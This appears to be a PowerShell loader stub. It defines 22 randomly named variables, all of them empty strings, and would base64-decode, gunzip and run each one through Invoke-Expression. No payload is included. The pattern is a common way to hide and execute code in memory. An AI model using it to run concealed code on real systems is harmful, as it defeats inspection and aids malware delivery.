#Requires -Version 2

$Noticeably = ""
$Recombined = ""
$Preventing = ""
$Disbarment = ""
$Obsequious = ""
$Victimizes = ""
$Woodenness = ""
$Housebroke = ""
$Exemptions = ""
$Telephoned = ""
$Appetizing = ""
$Archimedes = ""
$Unscrewing = ""
$Indentured = ""
$Conversing = ""
$Precursors = ""
$Binoculars = ""
$Striptease = ""
$Outrunning = ""
$Unaccented = ""
$Ghibelline = ""
$Concreting = ""

function ConvertFrom-Gzip {
    [CmdletBinding()] param([byte[]] $Bytes)
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Modules = @($Noticeably,$Recombined,$Preventing,$Disbarment,$Obsequious,$Victimizes,$Woodenness,$Housebroke,$Exemptions,$Telephoned,$Appetizing,$Archimedes,$Unscrewing,$Indentured,$Conversing,$Precursors,$Binoculars,$Striptease,$Outrunning,$Unaccented,$Ghibelline,$Concreting)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    ConvertFrom-Gzip -Bytes $Decoded | Invoke-Expression
}
